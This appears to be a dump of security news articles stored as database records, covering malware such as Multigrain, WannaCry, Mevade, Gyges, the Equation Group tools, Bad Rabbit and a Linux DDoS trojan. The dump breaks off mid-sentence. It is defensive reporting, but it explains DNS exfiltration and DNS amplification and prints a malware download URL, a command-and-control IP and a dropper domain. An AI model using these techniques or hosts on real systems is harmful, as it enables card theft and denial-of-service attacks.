The threat, dubbed “Multigrain,” is believed to be a variant of NewPosThings, a PoS malware family that has been in development since at least October 2013. According to FireEye, Multigrain is designed for highly targeted attacks aimed at systems running a specific PoS process (multi.exe) associated with a popular electronic draft capture (EDC) server software package. If the multi.exe process is not found on the infected device, the malware removes itself. Once it’s installed on a system, Multigrain creates a hash using the DJB2 algorithm based on the volume serial number and part of the MAC address. The resulting hash, the name of the computer and a version number are combined and encoded using a custom Base32 algorithm. The data is then added to a DNS query sent to a hardcoded domain. The malware then starts scraping the memory of the targeted process for track 2 payment card data, which it validates using the Luhn algorithm. FireEye has assigned Multigrain to the NewPosThings malware family because the threats have similar code, including for collecting card data and the DJB2 hashing algorithm used to identify the infected host. The track 2 records collected from the targeted process are each encrypted with a 1024-bit RSA public key, encoded using the custom Base32 algorithm, and stored in a buffer. The malware checks this buffer every five minutes and each data record found in it is sent to the attacker using a DNS query. Multigrain is not the first PoS malware to use DNS for data exfiltration — the same technique has been leveraged by the BernhardPOS and FrameworkPOS families. “Using DNS for data exfiltration provides several advantages to the attacker,” FireEye researchers said in a blog post. “Sensitive environments that process card data will often monitor, restrict, or entirely block the HTTP or FTP traffic often used for exfiltration in other environments. While these common internet protocols may be disabled within a restrictive card processing environment, DNS is still necessary to resolve hostnames within the corporate environment and is unlikely to be blocked.” The Multigrain sample analyzed by FireEye is digitally signed with a certificate issued by Comodo for the “AMO-K Limited Liability Company.” The certificate was revoked in October 2015.

The WannaCry ransomware, also known as Wanna Decryptor, WanaCrypt0r, WannaCrypt, Wana Decrypt0r and WCry, has hit hundreds of thousands of systems worldwide, including ones housed by banks, hospitals, ISPs, government agencies, transportation companies and manufacturing plants. The first clue that the WannaCry ransomware may have been created by North Korea was uncovered by Google researcher Neel Mehta. The expert noticed that a variant of WannaCry making the rounds in February, when the threat was less known, had code similarities with a tool used by the North Korea-linked cyber espionage group named Lazarus. The code in question was removed from later versions of the ransomware. Security firms such as Symantec and Kaspersky confirmed the connection to Lazarus, and Kaspersky said it was “improbable” that this was a false flag. Even the Shadow Brokers, the group that leaked the Equation Group exploits leveraged by WannaCry, attributed the attack to North Korea. However, not everyone agrees that North Korea is behind WannaCry. The threat intelligence team at endpoint security firm Cybereason believes North Korea is unlikely to be behind the campaign. “Nothing in North Korea’s past cyber campaigns or in their conventional military and foreign policy fit this mold. Looking at national identity, foreign policy and strategic messaging will greatly reduce the likelihood that Pyongyang ordered this campaign,” the company said in a blog post on Friday. " }

The malware appears to be originating from Russia and the Ukraine, and was caught targeting the manufacturing, transportation and government sectors in India, Canada, the U.K., the U.S and other countries. Since the campaign began July 23, the largest number of infections has been in the U.S., with smaller numbers recorded in Europe and South America.   The hardest hit sector was business services, which had 44 organizations impacted by attacks. The manufacturing sector was struck hard as well, with 32 organizations impacted. Twenty-eight government organizations were hit as well.   The Mevade malware was linked previously to a sudden surge in the number of Tor users earlier this year. It was eventually discovered that Mevade was downloading a Tor component on infected computers. According to Websense, the group's command and control infrastructure hosts malware and exploits such as CVE-2012-4681 and the heavy use of Mevade as well as attack infrastructure in Russia and the Ukraine means the cyber-gang behind the attacks is likely operation out of that region.   \"The malware analysis of Mevade…shows use of a reverse proxy capability (similar to Shylock), indicating a very flexible dropper that is well suited to rerouting network traffic, targeted theft of information, and facilitating lateral movement through target networks by creating a network-level backdoor,\" Websense noted in its analysis of the attack.   The use of the 3proxy tool allows \"attackers to tunnel traffic directly through the malware and directly onto a target network,\" researchers explained.   \"In these cases, the Proxy is configured as a reverse proxy, with the ability to tunnel through NAT (Network Address Translated) environments to create a connection to the attacker's infrastructure and initiate a backdoor directly into the target network (in this case, using SSL over port 443),\" Websense continued. \"The use of reverse proxies indicates that the cyber-criminals plan to manually scan a network and move laterally towards more critical apps and information (such as databases, critical systems, source-code, and document repositories) than might exist on the original machine that has been compromised.\" " }

The Arabic group has been active since at least 2012 and it’s tracked by various security firms as Gaza Cybergang, Gaza Hackers Team and Molerats. The cyberspies have targeted governments, oil and gas companies, media organizations, activists, diplomats, and politicians in countries such as Egypt, the United Arab Emirates, Yemen, Jordan, Libya, Iran, and Israel. Based on its analysis, ClearSky reported last year that Hamas was likely behind the Gaza Cybergang attacks. Kaspersky has been monitoring the group’s campaigns and says the attackers have continued to target government entities in the MENA region. A new target is an oil and gas company in the same region, from which the hackers stole information for more than a year. While the group continues to rely on the Cobalt Strike tool and pieces of malware such as Downeks and the Quasar RAT, researchers have found evidence suggesting that it may also be using a Trojan designed to target Android devices. The malware, first spotted in April 2017 on a command and control (C&C) server used by the group, may be linked to a previously analyzed attack targeting Israeli soldiers. Gaza Cybergang attacks typically start with an email containing a malicious attachment or link. In attacks launched after March 2017, Kaspersky also observed specially crafted Office files that delivered malware using macros. Since June 2017, the cyberspies have also leveraged an exploit for CVE 2017-0199, an Office vulnerability patched by Microsoft in April, when it had a zero-day status. While it’s not uncommon for threat actors to use macros to deliver malware, a majority of attacks involve Word documents. However, in the Gaza Cybergang attacks, the hackers embedded their malicious macros in Microsoft Access database files. Kaspersky believes the use of Access files could increase chances of evading detection. “Gaza Cybergang has demonstrated a large number of attacks, advanced social engineering, in addition to the active development of attacks, infrastructure and the utilization of new methods and techniques. Attackers are actively improving their toolkit in an effort to minimize their exposure to security products and services,” Kaspersky researchers said in a blog post. “Kaspersky Lab expects these types of attacks to intensify even more both in quality and quantity in the near term.” " }

According to Sentinel Labs, that metaphorical page has the name of a piece of malware known as 'Gyges' scribbled on it, as well as a list of capabilities normally associated with malware linked to cyber-espionage. The malware appears to originate from Russia, and is believed to have been designed to target government organizations. The specific variant of Gyges observed by Sentinel Labs contained what the firm's researchers called sophisticated anti-tampering and anti-detection techniques. It also waited for user inactivity - as opposed waiting for user activity, like most malware - in order to bypass sandbox-based security products that emulate users to trigger malware execution. The malicious code used by the malware for its evasion techniques is significantly more complex than the core executable, the researchers noted in a report on the malware. This led them to believe it was previously used as a \"bus\" or \"carrier\" for more sophisticated attacks. After some digging, they found traces inside the \"carrier\" code connected to previous targeted attacks that had the same characteristics. \"The carrier code we detected in the wild uses evasion techniques that make it invisible to virtually all security mechanisms,\" said Udi Shamir, head of research at Sentinel Labs. \"This level of sophistication is only typically seen in government-grade malware used for espionage. When we cross referenced this code with our intelligence database it demonstrated similarities to earlier nation state attack code that points back to Russia. This code is too complex and costly to develop for cyber-crime applications. We believe it was developed for cyber espionage, was modularized for use with commodity malware like ransomware and financial Trojans, and was leaked to cyber criminals.\" According to the firm, the code has been repurposed most often for ransomware attacks like Cryptolocker, as well as online banking fraud. The malware has been seen spreading through drive-by downloads and phishing schemes. The malware targets Windows 7 and 8 platforms and is designed for both x86 and x64 CPU architectures. It is also packed with a heavily-modified Yoda's Protector, which provides polymorphic encryption and anti-debugging, the security firm notes in a report on the malware. Among its capabilities, the malware counts data exfiltration, screen capture and keylogging. But perhaps the most interesting element of Gyges is its use of lesser known injection techniques. \"For example, Gyges uses a hooking bypass technique that exploits a logic bug in Windows 7 and Windows 8 (x86 and x64 versions),\" Shamir explained. \"The hooking bypass trick is simple. The malware translates its operations from 32bit to Native 64bit code, hiding the malicious activity. Each translation from 32bit to 64bit will not be detected by hooking what is injected to the Windows-on-Windows subsystem.\" Sentinel Labs CEO Tomer Weingarten told SecurityWeek that a big concern is that the code can be \"bolted-on\" to commodity malware like ransomware and online banking Trojans, making them difficult to detect by security tools.

In the aftermath, the number of spam campaigns using Blackhole to distribute malware fell off, and in the past two weeks have still not recovered. According to security researchers, use of the exploit kit seems to have chilled for the moment, and some cyber-crew have started switching tactics. For example, researchers at Dell SecureWorks report that following the arrest, one of the groups using the Cutwail spam botnet stopped spamming out links leading to the Blackhole exploit kit in favor of another kit known in the security community as Magnitude (formerly Popads). In that case, the spam emails have links that open up to a website that tells the user their browser is not up to date as a ruse to get them to download Gameover Zeus while a malicious iFrame redirects the browser to the Magnitude exploit kit. At that point, Magnitude installs the infamous ZeroAccess Trojan on the user's system if they are susceptible to any of the targeted vulnerabilities, such as CVE-2011-3402 (Windows) and CVE-2013-0633 (Adobe Flash Player). “Blackhole operations have gone silent,\" said Richard Henderson, security strategist at FortiGuard Labs.  \"Will other kits move in to fill the void left by [Blackhole]? Most definitely. When will we see this happen? It's hard to say right now, but for every hacker arrested, there's another who thinks he is skilled enough to avoid arrest and will take a shot at making their millions,\" he added. According to Chester Wisniewski, senior security advisor at Sophos, other exploits have actually already begun to fill that void. At the moment, the two most common exploit kits are Glazunov and Neutrino – though it is hard to account for who picked up the most business from Black Hole's demise, he said. Trend Micro security researcher Jonathan Leopando blogged underground forums are still digesting news of the arrest and what the long term impact may be. \"One particular area of concern in Russian underground forums is whether users of BHEK could face arrests themselves,\" he blogged. \"In particular, users who purchased BHEK directly from Paunch or his authorized resellers would be in Paunch’s database of clients, which is now presumably in the hands of law enforcement.\" The use of exploit kits as an infection vector has been cyclical for some time, noted Andrew Brandt, director of threat research at Blue Coat Systems. \"In spam-delivered campaigns, we saw an uptick in the use of exploit kits in August and early September, then their use trailed off after about the 10th  [of October],\" he said. \"We saw a gradual increase in Kuluoz-style email with links that simply deliver a .zip file and some messages with the .zip file already attached.\"  Elsewhere, exploit kits of many types remain in wide use on compromised websites, he said, and iframes and misdirection are being used to load the kit in the background while the victim surfs the Web. \"If the author of Black Hole sold the code, or had collaborators that were not apprehended, it is possibly that we could see the kit appear again in the future,\" said Curt Wilson, ASERT senior research analyst for Arbor Networks. \"There is also a possibility that the code may have leaked at some point, which could make that particular threat re-emerge. There is no shortage of exploit kits that can be rented or purchased in the underground, and threat actors are likely to have taken full advantage of the situation to encourage new customers to migrate from Black Hole to their particular exploit kit.\" " }
{ "_id" : { "$oid" : "5b27c4d66cefc41c844ab3ec" }, "Category" : "Malware", "Title" : "Report Connects Elite Hacking Group to NSA-Linked Cyberweapons", "Address" : "https://www.securityweek.com/report-connects-elite-hacking-group-nsa-linked-cyberweapons", "Date" : "February 16, 2015", "Article" : "Capabilities of \"Equation Group\" Surpass Anything Known in Terms of Complexity and Sophistication of Cyber Attack Techniques CANCUN, Mexico - KASPERSKY SECURITY ANALYST SUMMIT - Before Stuxnet and Flame even made ripples on the cybersecurity radar, there was a group working on sophisticated zero-day malware and cyber-attacks. This group, which combined sophisticated and complex attack tools with classic spying techniques, have been infecting victims worldwide in practically every industry sector since 2001, according to a new report from Kaspersky Lab. “There are solid links indicating that the Equation Group has interacted with other powerful groups, such as the Stuxnet and Flame operators—generally from a position of superiority,” Kaspersky Lab researchers said in the report released at the company's Security Analyst Summit in Cancun, Mexico on Monday.  The Equation Group uses complicated tools which were expensive to develop to infect victims, retrieve data, and hide activity in an “outstandingly professional way,” Kaspersky Lab researchers said.  The company estimates the Equation Group has infected thousands, “even tens of thousands,” of victims, in more than 30 countries worldwide, covering government and diplomatic institutions, Telecommunications, Aerospace, Energy, Nuclear research, Oil and Gas, Military, Nanotechnology, Islamic activists and scholars, Mass media, Transportation, Financial institutions and companies developing encryption technologies.   The Equation Group is a “threat actor that surpasses anything known in terms of complexity and sophistication of techniques,” Kaspersky Lab said. Considering the company has been monitoring more than 60 advanced threat actors responsible for cyber-attacks worldwide, that's saying a lot.  The researchers stopped shy of saying the Equation Group was part of the United States National Security Agency (NSA). But the sheer amount of explosive evidence they laid out strongly implicates the secret spy agency.  The Equation Group is known for using physical means to infect users, such as targeting participants at a scientific conference by sending them a malware-infected CD in the mail and intercepting a Cisco Systems router in the mail to implant Trojans in the firmware.  The Equation Group library includes a highly advanced keylogger called \"Grok.\" In March, news reports from Snowden-leaked documents referenced a NSA-developed keylogger with the same name. And finally, there are references to \"STRAITACID\" and \"STRAITSHOOTER\" in the Equation Code's source code which seems to echo \"STRAITBIZARRE,\" one of the most advanced malware platforms used by the NSA's Tailored Access Operations unit.  The Equation Group also had access to zero-days before they were used by Stuxnet and Flame, and at some point, it shared exploits with other operators. Kaspersky Lab observed seven exploits used by the Equation group in their malware, of which at last four were used as zero-days. An unknown exploit—possibly a zero-day—was used against Firefox 17, which is used in the Tor browser.  Kaspersky Lab has identified some of the Trojans used to infect victims, including EquationLaser, EquationDrug, DoubleFantasy, TripleFantasy, Fanny and GrayFish. Fanny in 2008 used two zero-days which were later introduced into Stuxnet in June 2009 and March 2010. Kaspersky Lab had disclosed earlier that one of the zero-days used in Stuxnet was actually a module created for Flame.  The Fanny worm, whose main purpose was to map air-gapped networks, stands out from all the attacks performed by the Equation Group, the researchers found. The worm could understand the topology of a network that cannot be reached from the Internet, and to execute commands to these isolated systems. The worm used a unique USB-based command and control mechanism which allowed the attackers to pass data back and forth from air-gapped networks. The attackers could save commands in the hidden storage area on an infected USB stick, and when it was plugged into the target machine, Fanny was able to execute those commands.  Kaspersky Lab researchers were able to recover two modules which allowed the group to reprogram hard drive firmware of more than a dozen of the popular hard disk drive brands, including Western Digital, Maxtor, Samsung, IBM, Micron, Toshiba, and Seagate. The malware has an extreme level of persistence that helps to survive disk formatting and OS reinstallation. “It means that we are practically blind, and cannot detect hard drives that have been infected by this malware,” said Costin Raiu, Director of the Global Research and Analysis Team at Kaspersky Lab. The malware could also create an invisible, persistent area hidden inside the hard drive to save exfiltrated information which can be later retrieved by the attackers. This means the attackers have the ability to capture the encryption password and save it into this hidden area, he said. \"It can resurrect itself forever,\" Raiu said. " }

Once it infects a device, Bad Rabbit looks for certain file types and encrypts them. The disk is also encrypted and a ransom screen is displayed when the computer boots, preventing the victim from accessing the operating system. The disk encryption and bootloader functionality are provided by code derived from a legitimate utility named DiskCryptor. Bad Rabbit has been linked to the NotPetya attack that caused significant disruptions to many companies back in late June. However, unlike NotPetya, which experts classified as a wiper due to the fact that victims could not recover their files even if they paid the ransom, files encrypted by Bad Rabbit can be recovered with the right decryption key. While the encryption mechanisms used by the attackers, AES-128-CBC and RSA-2048, cannot be cracked, Kaspersky experts have identified some methods that may allow some victims to decrypt their disk and recover files. When an infected computer boots up, users are informed that their files have been encrypted and they are instructed to make a payment in order to obtain the password needed for decryption. The same screen also allows victims who have already obtained a password to enter it and boot their system. Kaspersky researchers discovered that the password needed to boot the system is not wiped from memory after it’s generated, giving users the opportunity to extract it before the process that creates the password, dispci.exe, is terminated. Entering this password boots the system and decrypts the disk, the security firm told SecurityWeek, but there is only a “slim chance” that victims will actually be able to extract the password.  As for recovering files, experts noticed that Bad Rabbit does not delete shadow copies, which are backups made by Windows. If users enabled this backup functionality before the files were encrypted and the malware’s full disk encryption functionality failed for some reason or the disk is decrypted using the aforementioned method, the data can be restored via Windows or third-party utilities. Kaspersky has also confirmed that Bad Rabbit does in fact use an NSA-linked exploit to spread; earlier reports claimed no exploits had been observed. The malware uses EternalRomance, which NotPetya also leveraged. Based on the numerous similarities, the Bad Rabbit attack is believed to have been carried out by the same threat group that launched the NotPetya campaign, namely the Russia-linked threat actor known as BlackEnergy, TeleBots and Sandworm Team. Some are not convinced due to the fact that a majority of the victims were in Russia. Others pointed out, however, that the main target may have been Ukraine, where several major organizations were hit. " }

In a blog post, Kaspersky Lab's Mikhail Kuzin explained that the firm came across an article published in February on a Russian IT website titled 'Studying the BillGates Linux Botnet' that described a Trojan with DDoS functionality.  \"The capability that we found the most interesting was the Trojan's ability to conduct DNS Amplification-type attacks,\" wrote Kuzin, a junior malware analyst at Kaspersky Lab. \"In addition, it followed from the article that the Trojan had a sophisticated modular structure, something we had not seen in the world of Linux malware before.\" The article provided a link to download all of the Trojan's files. The archive contained a number of files that were all modules of the same Trojan: atddd; cupsdd; cupsddh; ksapdd; kysapdd; skysapdd; and xfsdxd. The files cupsdd and cupsddh are detected by Kaspersky Lab as Backdoor.Linux.Ganiw.a, while atddd and the remaining files are detected as Backdoor.Linux.Mayday.f. The archive with the files also contained a configuration file for cron - the Linux task scheduler. In this case, Kuzin stated, the utility is used to get a foothold on the system. Trojan uses cron to perform a number of tests. Once a minute it terminates the processes of all applications that can interfere with its operation: .IptabLes, nfsd4, profild.key, nfsd, DDosl, lengchao32, b26, codelove and node24. In addition, roughly once every 90 minutes it terminates all of its processes, and every two hours or so it downloads all of its components to the /etc folder from http://www.dgnfd564sdf.com:8080/[module_name] (module_name = name of the Trojan's module, e.g., cupsdd), after deleting these files from the /etc folder. It also re-launches all of its modules every 90 minutes and purges system logs and bash command history and execute chmod 7777 [module_name] every minute. \"During subsequent analysis of the files, we did not find any code responsible for saving the config file for cron,\" the researcher noted. \"Most likely, the file was manually downloaded to the victim machine by a cybercriminal after gaining remote access to the system.\" The file atddd is a backdoor designed to conduct various types of DDoS attacks against the servers specified. The backdoor begins by calling the function daemon(1, 0), continuing to run in the background and redirecting standard input, output and errors to /dev/null, the researcher explained. Next it collects information about the system, and then decrypts strings defining the command and control server's IP address and port number. Eventually, the C&C passes along commands to attack using UDP floods, TCP floods, ICMP floods and DNS flood attacks. Cupsdd (Backdoor.Linux.Ganiw.a) is also designed to carry out various types of DDoS attacks, but is more feature-rich and sophisticated, Kuzin blogged. In the case of Cupsddh, also detected as Backdoor.Linux.Ganiw.a, includes an attack that allows for DNS amplification. \"The last attack type on the list above is different in that packets are sent to vulnerable DNS servers, with the attack target specified as the sender's IP address,\" Kuzin blogged. \"As a result, the cybercriminal sends a small packet with a DNS request and the DNS server responds to the attack target with a significantly larger packet. The list of vulnerable DNS servers is stored in the file libamplify.so, which is written to disk following the relevant command from the C&C.\" \"To summarize, in the new version of the Trojan its authors have added a little 'robustness' without making any significant functionality changes,\" Kuzin blogged. \"It is also worth noting that the hard-coded IP address of the C&C server has remained the same (116.10.189.246) in this version, but the port number has changed - it is now 36008 instead of 30000 in the previous version.\" More detail can be found here.

The attacks affected banks, hospitals, ISPs, government agencies, transportation companies and manufacturing plants. While the campaign has earned the attackers more than $50,000 in just a few days, some experts are not convinced that profit-driven cybercriminals are behind the operation, and suggested that it could be the work of a nation-state actor, including one sponsored by North Korea. The attacks involved exploits dubbed EternalBlue and DoublePulsar, both leaked recently by a hacker group calling itself Shadow Brokers. The exploits were allegedly used by a threat actor called the Equation Group, which has been linked to the NSA. The EternalBlue exploit leverages a Server Message Block (SMB) vulnerability in Windows that can be exploited remotely without user interaction, which is the main reason why the ransomware managed to wreak havoc. The flaw was patched by Microsoft in March and the company has even made available fixes for outdated versions of Windows. However, many organizations have not installed the patches and in the case of industrial control systems (ICS), which are also at risk, the situation is more complicated. Industry professionals shared thoughts on the WannaCry attacks, including the ICS, insurance, legal, cybersecurity strategy, attribution and other aspects of the story. And the feedback begins… Phil Neray, VP of Industrial Cybersecurity, CyberX: “At the risk of sounding overly paranoid, I find it hard to believe that someone would orchestrate a global coordinated attack like this just to earn 50 thousand dollars. Security guru Bruce Schneier recently wrote that Russia and other nation-states often commit cyber-actions just for bragging purposes. For me, it's completely tenable that WannaCry is simply the Russians bragging they're already so deep into our critical infrastructure that we can't do anything about it.   Either way, it's worth noting that many of the SCADA applications embedded in our electrical grid and manufacturing plants were developed years ago and are tethered to older versions of Windows -- so the fix isn't going to be easy.   In the meantime, we should treat this attack as a persistent threat and continuously monitor both IT and OT networks for unusual activity. After all, how do we know that the same vulnerabilities haven't already been well-exploited for cyber-reconnaissance and cyber-espionage purposes? Or, that this isn't just the first phase of a more elaborate targeted campaign with the goal of causing massive disruption to our critical infrastructure and our economies?\" Wendi Whitmore, Global Lead, IBM X-Force IRIS: “Based on IBM X-Force analysis of over 500M spam e-mails, it seems likely the initial victims of the WannaCry ransomware did not get infected by opening a malicious e-mail or attachments. This means that criminals might have compromised systems by other means. This makes finding “patient zero” even more critical in the investigation. IBM X-Force is actively working with clients and law enforcement to track down this data.  Since Asia and Europe have come online today we’ve seen a modest increase in the amount of victims paying the ransom. So far, cybercriminals have pulled in $54,877.46 which continues to grow at ~1 BTC per hour.  Given the widespread propagation of the WannaCry ransomware in Eastern Europe and Asia, our research team suggests that these regions may be using older Microsoft software that is unsupported or pirated.” Joe Facciponti, attorney with Cadwalader, Wickersham & Taft: “The ransomware attack raises the possibility that victims will face regulatory enforcement actions and civil litigation in the U.S. and elsewhere. Indeed, last fall the former Chairwoman of the Federal Trade Commission (“FTC”) warned U.S. businesses, in the context of addressing ransomware, that a company’s “unreasonable” failure to patch vulnerabilities might be cause for an enforcement action under the FTC Act. Further, the possibility of harm to consumers – particular those who are potentially harmed by the loss of sensitive medical or financial data – raise the possibility of costly class action litigation against companies that are the victims of ransomware attacks.” Bill Kelly, Senior Vice President, E&O Underwriting, Argo Group: “Watching this story continue to unravel, has truly highlighted the need for cyber insurance. Any company can experience a vulnerability no matter how prepared they think they are. While ransomware can result in a company paying small, very random amounts, business interruption can be much more significant and can potentially cost millions.   There will always be a vulnerability that can’t be controlled and from an insurance standpoint, this is validation for the industry. In addition to having companies properly train their employees and ensure that they are up to speed on the importance of updating software patches in a consistent routine and have backup plans in place, it pays to have cyber insurance. Cybersecurity breaches are a reality every business must think about and having a whole team dedicated to helping you when something like this happens - from breach coaches and responders to forensic investigators - it's the best way to mitigate damages. We're continuing to learn from attacks like these by researching and working with industry experts to better understand the best ways to mitigate losses for our clients.” Jackson Shaw, senior director of product management at One Identity: “I applaud Microsoft for making the bold move to patch older, unsupported operating systems. They are under no obligation to do so and the organizations that did not upgrade their systems despite Microsoft’s statements that the OSes were moving to an unsupported state must accept the risk and responsibility for their decision. I liken it to this: when was the last time you took your eight year old car in for service and the repair shop said, “Don’t worry. I’ll just find that part which is no longer being produced and have it here in twelve hours for you…free of charge.” That’s what Microsoft did.   Will Microsoft’s release of a patch encourage organizations NOT to upgrade older systems? Probably. But what a shame that will be. If they don’t, they will be hacked again. And again. And again.   I applaud Microsoft’s desire to have a Digital Geneva Convention but at the same time, feel it’s a bit naïve. Attacking a civilian or a hospital with a grenade is far easier to spot and track than cyber weapons. And honestly, do we expect hackers, people who are behind these dreadful attacks, to adhere to some ethical set of guidelines? I think not.” Barak Perelman, CEO, Indegy: “The first response to this threat is to make sure all Windows-based machines are patched - this is a standard best practice. However, in industrial environments not all systems can be patched, since some support continuous operations that must operate 24X7. Such systems can't be restarted for example. There are also concerns around system availability and stability associated with deploying security patches.   Meanwhile, non-Windows based systems in industrial networks are also exposed to cyber threats and are much more difficult to protect. This includes the critical automation controllers (PLCs, RTUs and DCS controllers) that can't be easily patched, or don't have patches available. To make matters worse, due to the lack of encryption and access controls in industrial networks, attackers do not need to exploit vulnerabilities in order to compromise these critical control devices and shutdown operations.” Brad Hegrat, Director of Advisory Services, IOActive: “Historically, general purpose, run of the mill malware that leverages SMB and NetBIOS interfaces in the industrial environment are particularly troublesome, with many systems remaining infected many years later. [...] With the WannaCry/WanaCrypt ransomware in the wild, crossing into industrial control systems would be particularly devastating. Systems requiring real-time interfacing and control influence over physical assets could face safety/critical shutdown, or worse. When thinking about critical services to modern society (power, water, wastewater, etc.), there is a real potential, potentially for the first time ever, where critical services could be suspended due to ransomware. It may be time to rethink critical infrastructure cybersecurity engineering, because if MS17-010 exploiting malware variants are successful, we are clearly doing something wrong.” Kevin Curran, IEEE Senior Member and Cybersecurity Professor at Ulster University: “The spread of the attack was brought to a sudden halt when one UK cybersecurity researcher found and inadvertently activated a “kill switch” in the malicious software. It turns out that the virus was coded to check to see if an obscure website address was registered and live and to halt if this was the case. It was effectively a kill switch. This however can easily be overcome in a modified release which is what has already happened. Yes, this has indeed slowed the initial attack but this is only the first wave of such wormable ransomware attacks.   Finally, the warnings that security experts have been sounding for years has finally come to the attention of the public - that is that more money needs to be spent on cybersecurity and that organizations need to run modern patched operating systems and educate their staff in safe computing and of course to simply back up. Regular off premises (or non-network attached) backups would have prevented this modern nightmare.” Chris Goettl, product manager at Ivanti: “Most effective malware has the ability to adapt and use a number of exploits to infect and propagate. We are witnessing a jackpot or perfect storm combination that has allowed this attack to be so effective so quickly. It reminds me of incidents like Conficker, where all the right exploits came together to create the Mona Lisa of cyber attacks.   One tweet criticized Edward Snowden and called out the NSA for not privately disclosing the SMBv1 exploit when they first discovered it. While I do not condone agencies for discovering exploits and keeping them quiet, which puts us at long term risk, this vulnerability had the potential to contribute just as badly to an attack of this magnitude, regardless. Think about it: whether the vulnerability was disclosed a year ago or just recently, a knowledgeable attacker would have taken advantage of the vulnerability. This update, regardless of when it was released, made a change in the handling of SMB traffic which could cause significant issues when rolling out an update.” Moshe Ben-Simon, co-founder & VP services at Trapx: “Due to compliance regulations, such as HIPPA, healthcare network admins cannot easily update Internet connected medical devices with the newest operating systems and patches. These devices are sealed to protect the equipment from failure in the event a software update inadvertently affects the operation of the device. While this ultimately protects patients from potential harm from a malfunctioning device, it has the potential leave the network open to attackers who are finding new ways to exploit old vulnerabilities, such as the recent WannaCry attack. If these devices aren’t updated by the manufacturers immediately, they will continue to be susceptible to these types of attacks.   To better protect hospital networks that are using Internet connected medical devices, we recommend, reviewing and beefing up backup processes. It becomes essential to have an offsite backup on a daily basis. More important is a robust, tested, disaster recovery process that ensures core IT systems can be brought back up in a few hours. Most hospitals have backup in place to support compliance, of course, but really cannot restore key applications and recover operations fast enough in the face of a ransomware attack. When an environment faces a true disaster, even a well-planned disaster recovery strategy will typically take days until full operations are restored. Do the work to make sure this takes only a few hours.” Ilia Kolochenko, CEO of High-Tech Bridge: \"This incident exposes how a two-month old vulnerability can cause global panic and paralyze the largest companies and governmental institutions on all continents. Worse, cybercriminals could have easily released this worm just after the NSA's 0day was leaked two months ago, and this would have led to much more destructive consequences. [...] It would be unreasonable and inappropriate to blame the NSA for any significant contribution to this attack. Similar 0days are bought and sold almost every day, and many other organizations participate in these auctions - virtually anyone can (un)intentionally leak an exploit and cause similar damage. The real problem is that in 2017, the largest companies and governments still fail to patch publicly disclosed flaws for months. Practically speaking, the NSA doesn't really need a 0day to get their data - their negligence \"invite\" attackers to get in.  Companies and organizations that have fallen victim to this attack, can consider contacting their legal departments to evaluate whether their IT contractors can be held liable for negligence and breach of duty. Failure to update production systems for over two months - can certainly qualify at least as carelessness in many jurisdictions.\" Erez Breiman, CTO, Minera Labs: “The WannaCry outbreak highlights the challenges of defending legacy systems and services that are hard to patch, isolate and otherwise protect without impeding performance, violating vendor contracts or inconveniencing business users. As we already know, WannaCry uses a well-known exploit to access vulnerable machines via the SMB protocol. Optimized for the speed of propagation, this worm doesn’t attempt to hiding itself or attempt to evade detection mechanisms. After all, systems that are missing patches and that are not isolated behind a firewall that blocks unnecessary ports are also missing baseline antivirus and other endpoint security products. Organizations can contain the spread of malware to such systems by employing malware vaccination to stabilize the situation.” Sean Sullivan, security advisor at F-Secure: “This is a blast from the past as this kind of ransomware isn’t anything new. For far too long, organizations have been ignoring basic firewall hygiene which is why WannaCry has gotten out of hand so easily.   “This is not the worst-case scenario. The silver lining is that this wasn’t a destructive terrorist or nation state attack. Because it was profit-driven, it was designed to be undone upon payment and therefore there may be a chance to recover. However, this is a huge proof of concept for nation state actors that want to do something that might not be recoverable.” Dana Simberkoff, chief compliance and risk officer at AvePoint: “Within a company, security and data protection are not just the job of your CISO and CPO. It's everyone’s responsibility every day. Your employees may not be responsible for updating their corporate laptops and company issued devices, but if they're connecting to your corporate networks with personal devices, or home computers, they must be responsibly applying patches and updates to their own systems. Good cyber hygiene requires that you patch and update your operating systems regularly and as often as necessary. Operating systems that were properly patched were protected from this vulnerability by default.   Going forward you must implement continuous and ongoing education of your employees. This education cannot be a once a year training course, but rather it must be pervasive throughout the culture of your organization. Because in the absence of security education or experience, people (employees, users, and customers) naturally make poor security decisions with technology. This means that systems need to be easy to use securely and difficult to use insecurely. Your security and data protection education program should include information about the importance of patching your operating systems and the direct tie of “unpatched systems” to vulnerabilities.” Phillip Hallam-Baker, principal scientist, Comodo: “Ransomware is following the same trajectory as phishing. The criminals have worked out how to monetize the crime, and they know which types of businesses are likely to pay up-- and how to collect the money without being caught.   It appears that the NSA breach has accelerated the process. Instead of having to develop their own zero-day attacks, the criminals have used of an arsenal developed by experts at developing cyber-weapons.   The U.S. government clearly had its priorities wrong. Whether or not you think the U.S. government should be spending a fortune developing such cyber-weapons, surely it is obvious that the weapons they develop should be properly secured. If someone had lost a nuclear weapon, heads would have rolled. The CIA and NSA have been breached on a massive scale, and now the effects are being felt. What is going to be done to stop further leaks?” " }

The Bad Rabbit attack, which led to the infection of hundreds of machines in Russia and Ukraine with ransomware, started with users being redirected to 1dnscontrol[.]com, a domain that served a malware dropper disguised as a Flash Player installer. Users had to manually execute the file in order to become infected. FireEye noticed that several compromised websites redirecting to the 1dnscontrol domain had hosted a profiling tool. Tracked by the company as BACKSWING, the framework has been seen on more than 50 websites since September 2016, and four of them redirected users to Bad Rabbit ransomware this week. BACKSWING is designed to collect information about a user’s browsing session - including User-Agent, HTTP Referrer, cookies, and the current domain - and sends it back to a command and control (C&C) server. FireEye has seen two versions of the tool, the second version replacing the first one on several websites starting with October 5. BACKSWING v2 was mostly injected into legitimate JavaScript resources hosted by affected sites. “Malicious profilers allow attackers to obtain more information about potential victims before deploying payloads (in this case, the BADRABBIT ‘flash update’ dropper),” FireEye researchers explained. “While FireEye has not directly observed BACKSWING delivering BADRABBIT, BACKSWING was observed on multiple websites that were seen referring FireEye customers to 1dnscontrol[.]com, which hosted the BADRABBIT dropper.” If BACKSWING was in fact used by the threat group behind the Bad Rabbit ransomware, it would suggest that the attack was not financially motivated, as a profit-driven actor would not care about who they’re infecting as long as they make money. This also reinforces the theory that the Bad Rabbit operation was conducted by the Russia-linked threat group known as BlackEnergy, TeleBots and Sandworm Team, which is also believed to be behind the NotPetya wiper attack that targeted Ukraine and other countries in June. “We observed a spike of BACKSWING instances on Ukrainian sites, with a significant increase in May 2017. While some sites hosting BACKSWING do not have a clear strategic link, the pattern of deployment raises the possibility of a strategic sponsor with specific regional interests,” FireEye said. While many similarities have been found between NotPetya and Bad Rabbit, one major difference is that the latter mainly hit enterprises and most of the victims are in Russia. However, the relatively small number of Ukrainian organizations affected by the malware include high profile 